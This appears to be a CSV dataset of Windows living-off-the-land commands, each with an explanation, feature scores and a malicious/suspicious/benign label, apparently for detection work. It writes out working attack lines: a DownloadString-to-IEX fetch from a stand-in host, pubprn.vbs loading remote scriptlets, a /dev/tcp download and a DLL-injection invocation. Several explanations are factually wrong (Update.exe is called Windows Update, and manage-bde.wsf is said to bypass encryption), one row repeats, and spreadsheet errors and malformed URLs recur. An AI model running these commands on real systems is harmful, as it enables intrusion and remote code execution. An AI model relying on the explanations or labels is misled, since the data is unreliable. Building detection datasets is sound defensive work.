prompt,response,Lolbin (0.05),Content (0.4),Frequency (0.2),Source (0.1),Network (0.1),Behavioural (0.1),History (0.05),Score,Label
squirrel.exe --update [http://nice.domain],"Potential use: Download and execute malicious code from a remote server.
What it does: Updates the Squirrel framework with the specified URL.",squirrel.exe,http://nice.domain,none,http://nice.domain,nice.domain,#NAME?,none,0.75,malicious
te.exe bypass.wsc,This command can be used to execute a scriptlet file (.wsc) that can potentially bypass security measures and execute malicious code on a Windows machine.,te.exe,bypass.wsc,none,none,none,none,none,0.45,suspicious
Tracker.exe /d .\\calc.dll /c C:\\Windows\\write.exe,"This command can be used to inject malicious code into a legitimate process (write.exe) by loading a malicious DLL (calc.dll) into its memory space, allowing an attacker to execute arbitrary code on the compromised machine.",Tracker.exe,C:\\Windows\\write.exe,none,\\calc.dll,none,"/d,/c",none,0.65,malicious
Tracker.exe /d .\\calc.dll /c C:\\Windows\\write.exe,"This command can be used to inject malicious code into a legitimate process (write.exe) by loading a malicious DLL (calc.dll) into its memory space, allowing an attacker to execute arbitrary code on the compromised machine.",Tracker.exe,C:\\Windows\\write.exe,none,\\calc.dll,none,"/d,/c",none,0.65,malicious
Update.exe --download [http:/nice.domain],"Potential use: Downloading malicious code from a remote server.
What it does: Initiates a download of a file from the specified URL using the Windows Update service.",Update.exe,http://nice.domain,none,http://nice.domain,nice.domain,#NAME?,none,0.75,malicious
Update.exe --download [http://11.10.10.1],"Potential use: Downloading malicious code from a remote server.
What it does: Initiates a download of a file from the specified URL using the Windows Update executable.",Update.exe,http://11.10.10.1,none,http://11.10.10.1,11.10.10.1,#NAME?,none,0.75,malicious
Update.exe --download [http://10.10.10.1],This command can be used to download a file from a remote server and potentially update a program or install malware on the Windows machine.,Update.exe,http://10.10.10.1,none,http://10.10.10.1,10.10.10.1,#NAME?,none,0.75,malicious
Update.exe --update=[http://10.10.10.1],"This command could potentially be used to download and execute a malicious payload from a remote server specified in the URL, allowing an attacker to gain unauthorized access or control of the compromised Windows machine.",Update.exe,http://10.10.10.1,none,http://10.10.10.1,10.10.10.1,#NAME?,none,0.75,malicious
Update.exe --update=[http://11.10.10.1],"This command could potentially be used to download and execute a malicious payload from a remote server specified in the URL, allowing an attacker to gain unauthorized access or control of the compromised Windows machine.",Update.exe,http://11.10.10.1,none,http://11.10.10.1,11.10.10.1,#NAME?,none,0.75,malicious
Update.exe --update=[http:/nice.domain],"Potential use: Download and execute malicious code from a remote server.

What it does: Runs the Windows Update executable with a specified update URL, which could be a malicious server hosting malware.",Update.exe,http://nice.domain,none,http://nice.domain,nice.domain,#NAME?,none,0.75,malicious
Vsjitdebugger.exe calc.exe,"This command can be used to launch the Windows calculator (calc.exe) as a child process of the Visual Studio Just-In-Time Debugger (vsjitdebugger.exe), potentially allowing an attacker to execute arbitrary code or commands on the compromised machine.",Vsjitdebugger.exe,calc.exe,none,none,none,none,none,0.15,benign
"winword.exe ""http://192.168.1.10/TeamsAddinLoader.dll""",This command could potentially be used to download and execute a malicious DLL file from a remote server using Microsoft Word as a living off the land technique on a Windows machine.,winword.exe,http://192.168.1.10/TeamsAddinLoader.dll,none,http://192.168.1.10/TeamsAddinLoader.dll,192.168.1.10,none,none,0.65,malicious
wsl.exe -e /mnt/c/Windows/System32/calc.exe,"This command can be used to execute the Windows Calculator application from within the Windows Subsystem for Linux (WSL) environment, potentially allowing an attacker to bypass security measures and run malicious code on a compromised machine.",wsl.exe,/mnt/c/Windows/System32/calc.exe,none,/mnt/c/Windows/System32/calc.exe,none,#NAME?,none,0.65,malicious
wsl.exe --exec bash -c \'cat < /dev/tcp/192.168.1.10/54 > binary\',This command can be used to download a binary from a remote machine and save it locally on a Windows machine using the Windows Subsystem for Linux (WSL).,wsl.exe,/dev/tcp/192.168.1.10/54,none,/dev/tcp/192.168.1.10/54,192.168.1.10,"--exec,-c,cat",none,0.75,malicious
. C:\\\\Windows\\\\diagnostics\\\\system\\\\AERO\\\\CL_Mutexverifiers.ps1   \\nrunAfterCancelProcess calc.ps1,This command runs a PowerShell script that verifies the version of the AERO mutex and then runs another PowerShell script named calc.ps1 after canceling any previous instances of it. It could potentially be used in a living off the land attack to execute malicious PowerShell scripts and evade detection.,CL_Mutexverifiers.ps1,C:\\\\Windows\\\\diagnostics\\\\system\\\\AERO\\\\CL_Mutexverifiers.ps1,none,C:\\\\Windows\\\\diagnostics\\\\system\\\\AERO\\\\CL_Mutexverifiers.ps1,none,runAfterCancelProcess,none,0.65,malicious
. C:\\\\Windows\\\\diagnostics\\\\system\\\\AERO\\\\CL_Invocation.ps1   \\nSyncInvoke <executable> [args],"This command can be used to execute an arbitrary executable with arguments, potentially allowing an attacker to run malicious code on the system.",CL_Invocation.ps1,C:\\\\Windows\\\\diagnostics\\\\system\\\\AERO\\\\CL_Invocation.ps1,none,C:\\\\Windows\\\\diagnostics\\\\system\\\\AERO\\\\CL_Invocation.ps1,none,SyncInvoke,none,0.65,malicious
set comspec=c:\\windows\\system32\\calc.exe & cscript c:\\windows\\system32\\manage-bde.wsf,"This command sets the command prompt to open the calculator and then runs a Windows script to manage BitLocker Drive Encryption, potentially allowing an attacker to bypass encryption and access sensitive data.",none,c:\\windows\\system32\\manage-bde.wsf,none,c:\\windows\\system32\\calc.exe,none,"comspec,cscript",none,0.65,malicious
pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct,"This command can be used to execute a remote script on a Windows machine, potentially allowing an attacker to download and execute malicious code.",pubprn.vbs,https://domain.com/folder/file.sct,none,https://domain.com/folder/file.sct,127.0.0.1,none,none,0.65,malicious
pubprn.vbs 127.0.0.1 script:https://10.10.10.10/folder/file.sct,"This command can be used to execute a remote script on a Windows machine, potentially allowing an attacker to download and execute malicious code.",pubprn.vbs,https://10.10.10.10/folder/file.sct,none,https://10.10.10.10/folder/file.sct,127.0.0.1,none,none,0.65,malicious
pubprn.vbs 127.0.0.1 script:https://11.10.10.10/folder/file.sct,"This command can be used to execute a remote script on a Windows machine, potentially allowing an attacker to download and execute malicious code.",pubprn.vbs,https://11.10.10.10/folder/file.sct,none,https://11.10.10.10/folder/file.sct,127.0.0.1,none,none,0.65,malicious
reg.exe import c:\\path\\to\\Slmgr.reg & cscript.exe /b c:\\windows\\system32\\slmgr.vbs,"This command imports a registry file and then runs a VBScript to manage Windows activation, potentially allowing an attacker to activate a stolen or pirated copy of Windows on a compromised machine.",reg.exe,c:\\windows\\system32\\slmgr.vbs,none,c:\\path\\to\\Slmgr.reg,none,"import,cscript,/b",none,0.65,malicious
"SyncAppvPublishingServer.vbs ""n;((New-Object Net.WebClient).DownloadString(\'http://some.url/script.ps1\') | IEX""","This command can be used to download and execute a PowerShell script from a remote server, potentially allowing an attacker to gain unauthorized access or execute malicious code on the compromised machine.",SyncAppvPublishingServer.vbs,New-Object Net.WebClient,none,http://some.url/script.ps1\,none,"DownloadString, IEX",none,0.65,malicious
